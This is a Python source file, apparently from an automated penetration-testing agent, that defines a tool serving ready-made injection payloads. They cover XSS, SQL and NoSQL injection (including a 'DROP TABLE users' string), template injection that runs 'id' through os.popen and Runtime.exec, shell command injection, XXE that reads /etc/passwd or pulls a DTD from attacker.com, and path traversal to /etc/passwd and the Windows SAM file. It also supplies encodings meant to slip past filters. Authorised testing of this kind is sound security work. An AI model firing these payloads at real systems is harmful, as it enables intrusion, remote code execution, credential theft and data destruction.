"""Polyglot payload generator for multi-context exploitation."""

from __future__ import annotations

from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


PolyglotAction = Literal["generate", "list_types", "custom"]


# Polyglot payload templates
POLYGLOT_PAYLOADS = {
    "xss_basic": {
        "description": "Basic XSS polyglot working in multiple contexts",
        "payloads": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
            "'\"><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "`;alert(1);//"
        ]
    },
    "xss_advanced": {
        "description": "Advanced XSS polyglot with multiple bypass techniques",
        "payloads": [
            "'\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<IMG SRC=x ONERROR=alert(1)>",
            "<INPUT ONFOCUS=alert(1) AUTOFOCUS>",
            "<SELECT ONFOCUS=alert(1) AUTOFOCUS>",
            "<TEXTAREA ONFOCUS=alert(1) AUTOFOCUS>",
            "<IFRAME SRC=\"javascript:alert(1)\">",
            "<BODY ONLOAD=alert(1)>"
        ]
    },
    "sqli_basic": {
        "description": "SQL injection polyglot working across different DBMS",
        "payloads": [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--"
        ]
    },
    "sqli_union": {
        "description": "UNION-based SQL injection polyglots",
        "payloads": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--"
        ]
    },
    "ssti_basic": {
        "description": "Server-Side Template Injection polyglots",
        "payloads": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}"
        ]
    },
    "ssti_advanced": {
        "description": "Advanced SSTI exploitation payloads",
        "payloads": [
            "{{config}}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}"
        ]
    },
    "command_injection": {
        "description": "Command injection polyglots",
        "payloads": [
            ";id",
            "|id",
            "`id`",
            "$(id)",
            "&& id",
            "|| id",
            "; id #",
            "| id #",
            "`id` #",
            "$(id) #"
        ]
    },
    "xxe_basic": {
        "description": "XXE (XML External Entity) polyglots",
        "payloads": [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>"
        ]
    },
    "path_traversal": {
        "description": "Path traversal polyglots",
        "payloads": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
    },
    "ldap_injection": {
        "description": "LDAP injection polyglots",
        "payloads": [
            "*",
            "*)(&",
            "*))%00",
            ")(cn=*",
            "*()|&'",
            "admin*)((|userpassword=*"
        ]
    },
    "nosql_injection": {
        "description": "NoSQL injection polyglots (MongoDB)",
        "payloads": [
            "' || '1'=='1",
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "' || 'a'=='a",
            "{\"$regex\": \".*\"}",
            "'; return true; var foo='bar"
        ]
    },
    "multi_context": {
        "description": "Multi-context polyglot (XSS + SQL + Command)",
        "payloads": [
            "1';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "'><img src=x onerror=alert(1)> | whoami",
            "'; DROP TABLE users;--<script>alert(1)</script>",
            "\"><script>alert(1)</script>`whoami`"
        ]
    }
}


def _encode_payload(payload: str, encoding: str) -> str:
    """Apply encoding to payload."""
    if encoding == "url":
        import urllib.parse
        return urllib.parse.quote(payload)
    elif encoding == "double_url":
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == "html":
        import html
        return html.escape(payload)
    elif encoding == "base64":
        import base64
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    else:
        return payload


@register_tool
def polyglot_generator(
    action: PolyglotAction,
    payload_type: str | None = None,
    encoding: str | None = None,
    custom_template: str | None = None,
    **kwargs: Any,  # Capture unknown parameters
) -> dict[str, Any]:
    """Generate polyglot payloads for multi-context exploitation.
    
    Polyglot payloads work across multiple contexts (HTML, JavaScript, SQL, etc.)
    and are useful for testing multiple vulnerability types simultaneously.
    
    Args:
        action: The generation action:
            - generate: Generate polyglot payloads for specified type
            - list_types: List all available polyglot types
            - custom: Generate custom polyglot from template
        payload_type: Type of polyglot to generate (xss_basic, sqli_basic, ssti_basic, etc.)
        encoding: Optional encoding to apply (url, double_url, html, base64, unicode)
        custom_template: Custom payload template for custom action
    
    Returns:
        Generated polyglot payloads with descriptions and usage examples
    
    Example:
        # Generate XSS polyglots:
        polyglot_generator(action="generate", payload_type="xss_basic")
        
        # Generate with URL encoding:
        polyglot_generator(
            action="generate",
            payload_type="sqli_basic",
            encoding="url"
        )
        
        # List all types:
        polyglot_generator(action="list_types")
    """
    # Define valid parameters and actions
    VALID_PARAMS = {
        "action",
        "payload_type",
        "encoding",
        "custom_template",
    }
    VALID_ACTIONS = ["generate", "list_types", "custom"]

    # Check for unknown parameters
    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "polyglot_generator")
    if unknown_error:
        unknown_error.update(
            generate_usage_hint("polyglot_generator", "generate", {"payload_type": "xss_basic"})
        )
        return unknown_error

    # Validate action parameter
    action_error = validate_action_param(action, VALID_ACTIONS, "polyglot_generator")
    if action_error:
        action_error["usage_examples"] = {
            "generate": "polyglot_generator(action='generate', payload_type='xss_basic')",
            "list_types": "polyglot_generator(action='list_types')",
            "custom": "polyglot_generator(action='custom', custom_template='<script>...{payload}...</script>')",
        }
        return action_error

    # Validate required parameters based on action
    if action == "generate":
        param_error = validate_required_param(payload_type, "payload_type", action, "polyglot_generator")
        if param_error:
            param_error.update(
                generate_usage_hint("polyglot_generator", action, {"payload_type": "xss_basic"})
            )
            return param_error

    if action == "custom":
        param_error = validate_required_param(custom_template, "custom_template", action, "polyglot_generator")
        if param_error:
            param_error.update(
                generate_usage_hint("polyglot_generator", action, {"custom_template": "<script>...{payload}...</script>"})
            )
            return param_error

    try:
        if action == "list_types":
            return {
                "available_types": [
                    {
                        "type": ptype,
                        "description": data["description"],
                        "payload_count": len(data["payloads"])
                    }
                    for ptype, data in POLYGLOT_PAYLOADS.items()
                ],
                "total_types": len(POLYGLOT_PAYLOADS),
                "encoding_options": ["url", "double_url", "html", "base64", "unicode"],
                "usage": "Use 'generate' action with payload_type parameter to get specific payloads"
            }
        
        if action == "generate":
            if not payload_type:
                return {
                    "error": "payload_type parameter required",
                    "available_types": list(POLYGLOT_PAYLOADS.keys())
                }
            
            if payload_type not in POLYGLOT_PAYLOADS:
                return {
                    "error": f"Unknown payload type: {payload_type}",
                    "available_types": list(POLYGLOT_PAYLOADS.keys())
                }
            
            payload_data = POLYGLOT_PAYLOADS[payload_type]
            payloads = payload_data["payloads"]
            
            # Apply encoding if specified
            if encoding:
                payloads = [_encode_payload(p, encoding) for p in payloads]
            
            return {
                "payload_type": payload_type,
                "description": payload_data["description"],
                "encoding": encoding or "none",
                "payload_count": len(payloads),
                "payloads": payloads,
                "usage_notes": [
                    "Test each payload in different contexts",
                    "Look for reflected output in responses",
                    "Check for errors that indicate successful injection",
                    "Try variations if initial payloads are filtered",
                    "Combine with encoding options to bypass filters"
                ],
                "testing_tips": _get_testing_tips(payload_type)
            }
        
        if action == "custom":
            if not custom_template:
                return {
                    "error": "custom_template parameter required for custom action",
                    "example": "'{injection_point}' OR '1'='1--"
                }
            
            # Generate variations
            variations = _generate_custom_variations(custom_template)
            
            return {
                "template": custom_template,
                "variations": variations,
                "count": len(variations),
                "note": "Custom variations generated based on template"
            }
        
        return {"error": f"Unknown action: {action}"}
    
    except (ValueError, KeyError) as e:
        return {"error": f"Polyglot generation failed: {e!s}"}


def _get_testing_tips(payload_type: str) -> list[str]:
    """Get testing tips for specific payload type."""
    tips = {
        "xss_basic": [
            "Test in URL parameters, form inputs, headers",
            "Look for reflected input in HTML, JavaScript, attributes",
            "Check developer tools console for execution",
            "Try in different input fields simultaneously"
        ],
        "sqli_basic": [
            "Test in search fields, ID parameters, login forms",
            "Look for SQL errors in responses",
            "Check for boolean-based blind injection",
            "Try time-based payloads if no direct feedback"
        ],
        "ssti_basic": [
            "Test in template variables, user profiles, comments",
            "Look for mathematical evaluation (49 for {{7*7}})",
            "Check for server errors indicating template processing",
            "Try different template engine syntaxes"
        ],
        "command_injection": [
            "Test in system commands, file operations, ping utilities",
            "Look for command output in responses",
            "Try time-based detection with sleep/ping",
            "Check for out-of-band callbacks"
        ]
    }
    
    return tips.get(payload_type, [
        "Test in relevant input fields and parameters",
        "Monitor responses for evidence of successful injection",
        "Try multiple payloads to identify filtering patterns",
        "Use encoding techniques to bypass protections"
    ])


def _generate_custom_variations(template: str) -> list[str]:
    """Generate variations of custom template."""
    variations = [template]
    
    # Case variations
    if "'" in template:
        variations.append(template.replace("'", "\""))
    
    # Comment variations
    for comment in ["--", "#", "/*"]:
        if comment not in template:
            variations.append(template + comment)
    
    # Encoding variations (sample)
    variations.append(template.replace(" ", "+"))
    variations.append(template.replace(" ", "%20"))
    
    return list(set(variations))
